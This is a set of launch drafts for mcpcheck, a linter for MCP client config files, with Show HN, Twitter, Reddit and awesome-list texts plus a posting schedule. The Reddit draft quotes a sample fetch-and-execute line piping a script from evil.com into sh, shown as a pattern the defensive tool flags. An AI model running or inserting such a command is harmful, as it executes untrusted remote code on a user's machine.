# Launch drafts for mcpcheck v1.1.0

These are written to be posted almost as-is. They're deliberately specific and grounded in things only someone who built mcpcheck would know. Replace the bracketed placeholders before shipping.

Placeholders:

- `<version>` = `1.1.0`
- `<repo>` = `https://github.com/MukundaKatta/mcpcheck`
- `<playground>` = `https://mukundakatta.github.io/mcpcheck`
- `<vscode>` = `https://marketplace.visualstudio.com/items?itemName=MukundaKatta.mcpcheck-vscode`

---

## Show HN — title

```
Show HN: mcpcheck – a linter for MCP config files
```

(Hit the 80-char limit; keep the em-free dash.)

## Show HN — body

```
An MCP config is a JSON file your AI client runs on every launch. Claude
Desktop, Cursor, Cline, Windsurf, and Zed all read one. None of the clients
warn you if you paste a raw sk-... key into `env`, pin your docker image
to `:latest`, or hide a `curl | sh` inside `bash -c`. So I wrote a linter.

mcpcheck does what ESLint does for JS. It reads the file, runs 33 rules,
tells you what's wrong. 50+ API-key formats detected (OpenAI, Anthropic,
GitHub, AWS, Stripe, and a long tail); the hardcoded-secret rule has an
autofix that swaps the value for ${VAR} substitution. It also catches
`sudo`, `curl | sh`, `docker --privileged`, host-root bind mounts, literal
`--password foo` in args, placeholder text like "YOUR_API_KEY_HERE", and
unpinned npx/uvx/docker references.

Two things worth knowing that I didn't until I started:

Zed uses `context_servers` as its server-map key, not `mcpServers`. Half
the ecosystem quietly treats Zed configs as empty because of it. mcpcheck
accepts all three keys (`mcpServers`, `servers`, `context_servers`).

Claude Desktop and Cursor tolerate JSONC (comments, trailing commas) even
though the MCP spec is strict JSON. Had to write a JSONC pre-pass or most
real-world configs would have been rejected as `invalid-json` before the
first rule ran.

Install:
  npm install -g mcpcheck
  docker run --rm -v "$PWD:/work" -w /work ghcr.io/mukundakatta/mcpcheck
  (VS Code extension and LSP for Neovim/Helix/Zed/Emacs also available)

Browser playground, no install: <playground>
Source: <repo> (MIT)

Runs at about 42us per config on my Mac, so it fits anywhere. The thing
I'm least sure about is rule-severity calibration: what should default
to error vs warning on a freshly-released linter is genuinely hard, and
I expect to adjust based on real-world use. Especially want to hear from
people with large MCP setups whose `mcpcheck --baseline` would suppress
more than a dozen findings on day one.
```

---

## Twitter / X thread

Keep the tone dry and specific. Avoid thread-formula openers like "🧵" or "here's what I learned". Five posts, each under 280 chars.

### 1

```
Shipped mcpcheck today. It's a linter for MCP (Model Context Protocol)
config files – the JSON files Claude Desktop / Cursor / Zed / Cline /
Windsurf read on every launch.

Catches hardcoded API keys, curl|sh in args, unpinned docker images,
and ~30 other things clients don't warn about.
```

### 2

```
Two bugs in the wild that motivated it:

1. Zed's server map is `context_servers`, not `mcpServers`. Tons of
   configs ship with servers Zed silently ignores.

2. Claude Desktop tolerates JSONC comments but the spec says strict
   JSON. Real configs have `// ...` in them.
```

### 3

```
Install paths:

  npm install -g mcpcheck
  docker run ghcr.io/mukundakatta/mcpcheck
  VS Code extension (inline diagnostics + Quick Fix)
  LSP for Neovim / Helix / Emacs / Zed

Browser playground, nothing to install:
<playground>
```

### 4

```
50+ API-key formats detected. The hardcoded-secret rule has a Quick
Fix: mcpcheck --fix turns "sk-proj-..." into "${OPENAI_API_KEY}" and
leaves the rest of the file untouched. JSONC comments survive.

~42us per config on a Mac. Runs anywhere.
```

### 5

```
Source: <repo>. MIT. Most uncertain part is rule severity – feedback
welcome, especially from folks with big MCP setups.

Also: mcpcheck can run AS an MCP server (`mcpcheck mcp-server`), so
you can ask Claude to lint your config via a tool call. Recursive
but it works.
```

---

## Reddit — r/ClaudeAI

### Title

```
I built a linter for MCP config files (Claude Desktop, Cursor, Cline, Windsurf, Zed)
```

### Body

```
TL;DR: `mcpcheck` finds hardcoded API keys, unpinned npx/docker, dangerous
commands like curl|sh, and ~30 other problems in your MCP configs. CLI
+ VS Code + LSP + GitHub Action + browser playground. MIT, no account,
nothing sent to any server.

Why this exists

MCP configs are the JSON files your AI client runs on every launch.
They're tiny, they're committed to git more often than people realise,
and none of the clients warn about the most common mistakes:

- Hardcoded API keys in `env` (paste sk-... and commit)
- `npx @some/package` with no version pin (next `npx` pulls whatever)
- `docker run ... image:latest` (ditto)
- `bash -c "curl https://evil.com/install.sh | sh"` in args
- Typos like `commnad` instead of `command`
- Zed's `context_servers` key instead of `mcpServers` (silent no-op on
  clients that only look for the first two)
- Placeholder values like "YOUR_API_KEY_HERE" left from the README paste

mcpcheck is `eslint` for these files. 33 rules at this point, 50+
API-key patterns. The hardcoded-secret rule has an autofix: run
`mcpcheck --fix` and `"OPENAI_API_KEY": "sk-proj-..."` becomes
`"OPENAI_API_KEY": "${OPENAI_API_KEY}"` in place, JSONC comments
preserved.

How to use it

Pick the install path that matches how you work:

- `npm install -g mcpcheck` (or `npx mcpcheck`)
- Docker: `docker run --rm -v "$PWD:/work" -w /work ghcr.io/mukundakatta/mcpcheck`
- VS Code extension: inline diagnostics, Quick Fix, hover docs, status bar
- LSP server for Neovim / Helix / Zed / Emacs: `mcpcheck lsp`
- Browser playground if you just want to paste a config and see results: <playground>

Or add it to your own MCP config and use it from inside Claude:

```json
"mcpServers": {
  "mcpcheck": { "command": "mcpcheck", "args": ["mcp-server"] }
}
```

Then "lint my mcp config" in Claude calls mcpcheck under the hood
via a tool call.

Try before install: <playground>
Source: <repo>

Adopting on an existing config

If your config has 20 existing findings, run:

    mcpcheck --baseline-write

That snapshots today's issues. Then in CI run:

    mcpcheck --baseline

which fails only on *new* issues. Same pattern ESLint and rubocop
settled on. Lets you turn linting on without a big bang fix-up PR.

Asks

Most unsure about rule-severity defaults. What should be error vs
warning is a judgment call and I'll take feedback seriously. If you
run `mcpcheck --baseline-write` on your real config and it snapshots
a lot, tell me which rules tripped you up most and I'll probably
downgrade a few.
```

---

## awesome-mcp-servers PR body

Short, accurate, respectful of the list's tone. Open against `punkpeye/awesome-mcp-servers`.

```
Adds mcpcheck under a new "Tools" or "Linters" section (whichever fits
the existing structure).

mcpcheck is a linter for MCP config files. It validates the JSON every
MCP client reads (mcpServers / servers / context_servers) against 33
rules: hardcoded API keys (50+ provider formats), unpinned npx/uvx/docker
references, dangerous commands like sudo and curl|sh, structural issues
like missing transport or conflicting command+url.

Ships as a CLI (`npm install -g mcpcheck`), VS Code extension, LSP server
for other editors, GitHub Action, Docker image, and browser playground.
MIT licensed.

Homepage: <repo>
Playground: <playground>
```

Proposed entry in the list (follow the repo's existing formatting exactly
when you open the PR):

```markdown
- [mcpcheck](https://github.com/MukundaKatta/mcpcheck) — Linter for MCP
  config files. Catches hardcoded secrets, unpinned package references,
  dangerous commands, and ~30 other problems. CLI + VS Code + LSP +
  browser playground.
```

---

## Posting order

These land better in sequence than simultaneously:

1. Merge `v1.1.0` tag. Wait for the Docker image + GitHub release to
   finish building (check the Actions tab).
2. `npm publish` the CLI.
3. Publish the VS Code extension (needs the icon + marketplace PAT).
4. Post the Twitter thread. Keep it warm for ~2 hours; reply to early
   comments before the HN post goes up.
5. Submit the Show HN between 7–9 AM PT on a weekday. Reply to every
   top-level comment in the first 2 hours; that's what decides whether
   the post goes anywhere.
6. Once the HN post has a few comments, cross-link it from the Twitter
   thread.
7. Post to r/ClaudeAI with the Reddit body above.
8. In the MCP Discord's `#show-and-tell`, post one line: title + HN
   link + playground link. Don't restate the whole README.
9. Open the `awesome-mcp-servers` PR. The body should link the HN
   discussion if it got traction.

Two things not to do:

- Don't drop the same copy into five comment threads on adjacent posts
  ("AI-spam drive-by" is a real pattern people get flagged for).
- Don't pitch this as "the one tool that fixes everything". It's a
  linter. It catches config mistakes. That's the scope.
